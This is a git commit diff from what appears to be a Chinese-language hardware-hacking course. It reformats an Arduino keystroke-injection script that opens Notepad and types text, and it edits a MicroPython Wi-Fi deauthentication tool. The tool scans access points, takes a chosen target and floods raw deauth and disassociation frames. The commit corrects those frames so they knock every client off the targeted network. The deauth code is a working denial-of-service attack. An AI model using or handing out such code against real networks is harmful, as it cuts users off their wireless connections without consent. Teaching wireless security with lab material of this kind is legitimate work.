4894c38d3aed3f166139f94b436f46b7f7f84329
SamsonWoof <garywang323@gmail.com>
2020-07-22 12:30:27 +0800

    PDF同款版

--- lab03/lab03.ino
+++ lab03/lab03.ino
@@ -8,21 +8,21 @@ void setup() {
   Keyboard.press('r');
   delay(500);
   Keyboard.releaseAll();
-   Keyboard.print("NOTEPAD");                   //輸入文字 NOTEPAD
+  Keyboard.print("NOTEPAD");       //輸入文字 NOTEPAD
   delay(500);
-  Keyboard.press(KEY_RETURN);                  //按下 Enter
+  Keyboard.press(KEY_RETURN);      //按下 Enter
   Keyboard.release(KEY_RETURN);
-  delay(1500);                                                       //每個目標裝置開啟程式時間不同, 可視情況修改
+  delay(1500);                     //每個目標裝置開啟程式時間不同, 可視情況修改
 
-  Keyboard.print("T");                                       //輸入字首 T
-  Keyboard.press(KEY_CAPS_LOCK);          //按下 Caps Lock 鍵
-  Keyboard.release(KEY_CAPS_LOCK);      //放開 Caps Lock 鍵
-  delay(500);  
-  Keyboard.print("HIS IS LAB ");                   //這邊在實際輸出文字會變成小寫
-  Keyboard.press(KEY_CAPS_LOCK); 
-  Keyboard.release(KEY_CAPS_LOCK); 
-  delay(500);  
-  Keyboard.print("THREE");          
+  Keyboard.print("T");             // 輸入字首 T
+  Keyboard.press(KEY_CAPS_LOCK);   // 按下 Caps Lock 鍵
+  Keyboard.release(KEY_CAPS_LOCK); // 放開 Caps Lock 鍵
+  delay(500);
+  Keyboard.print("HIS IS LAB ");   // 這邊在實際輸出文字會變成小寫
+  Keyboard.press(KEY_CAPS_LOCK);
+  Keyboard.release(KEY_CAPS_LOCK);
+  delay(500);
+  Keyboard.print("THREE");
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
   delay(500);
@@ -30,17 +30,17 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
   delay(500);
-  Keyboard.print("T"); 
-  Keyboard.press(KEY_CAPS_LOCK); 
-  Keyboard.release(KEY_CAPS_LOCK);                                          
+  Keyboard.print("T");
+  Keyboard.press(KEY_CAPS_LOCK);
+  Keyboard.release(KEY_CAPS_LOCK);
   Keyboard.print("HIS IS THE END OF TYPING");
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
   delay(500);
   Keyboard.print("BYE BYE");
-  Keyboard.press(KEY_CAPS_LOCK);  
+  Keyboard.press(KEY_CAPS_LOCK);
   Keyboard.release(KEY_CAPS_LOCK);
-  Keyboard.end();                                               //結束鍵盤操作  
+  Keyboard.end();                   // 結束鍵盤操作
 }
 
 void loop() {
--- lab06/lab06.py
+++ lab06/lab06.py
@@ -1,28 +1,29 @@
-
+# %% 匯入需要的模組, 設定無線網路為 station 模式
 import network, time, uos, wireless ,ubinascii
 
-
-#sta = network.WLAN(network.STA_IF)
 sta = wireless.attack(network.STA_IF)
 sta.active(True)
 ssid =''
-bssid =''                                    
+bssid =''
 channel =''
-_client = [0xFF,0xFF,0xFF,0xFF,0xFF,0xFF]     #預設 MAC address
+# MAC address 全部為 0xFF, 表示在區域網路進行廣播
+_client = [0xFF,0xFF,0xFF,0xFF,0xFF,0xFF]
 
+# %% 定義掃描函式
 def scanAp():
     ap_list = sta.scan()
     print("******************************")
-    print('{:>2} {:<20} {:<20}'.format('', 'SSID', '   MAC ADDRESS'))
     # 使用格式化字串來對齊輸出結果
-    for index, ap in enumerate(ap_list):
+    print('{:>2} {:<20} {:<20}'.format('', 'SSID', ' MAC ADDRESS'))
     # enumerate 可以取得資料的索引
+    for index, ap in enumerate(ap_list):
         ssid = ap[0].decode()
         mac = ubinascii.hexlify(ap[1], ':').decode()
         print('{:>2} {:<20} {:>17}'.format(index, ssid, mac))
     print("******************************")
     return ap_list
 
+# %% 定義函式根據訊框格式組合並送出
 def send_frame(destination, source, type, reason):
     packet = bytearray([0xC0, 0x00,                         # 0 - 1：訊框類型, 子類型                 
                         0x00, 0x00,                         # 2 - 3：持續佔用頻道時間                 
@@ -42,7 +43,8 @@ def send_frame(destination, source, type, reason):
         return True
     else:
         return False
-    
+
+# %% 主程式
 while True:
     ap_list = scanAp()
     tgtIndex = input('請輸入目標編號 (留空再次掃描) : ')
@@ -64,12 +66,12 @@ while True:
         print('---deauth runing-----')
         for i in range(0,atknum):
         #根據輸入的攻擊次數重複執行
-            r_ = send_frame(bssid, _client, 0xC0, 0x01)
-            #先對目標 AP 發送 deauth 請求
+            r_ = send_frame(_client, bssid, 0xC0, 0x01)
+            # 對所有客戶端發送 deauth 請求
 
-            if r_:                
-                send_frame(bssid, _client, 0xA0, 0x01)      
-                #對目標 AP 發送 disassociate 請求
+            if r_:
+                send_frame(_client, bssid, 0xA0, 0x01)      
+                # 對所有客戶端發送 disassociate 請求
 
                 time.sleep_ms(5)
             else:
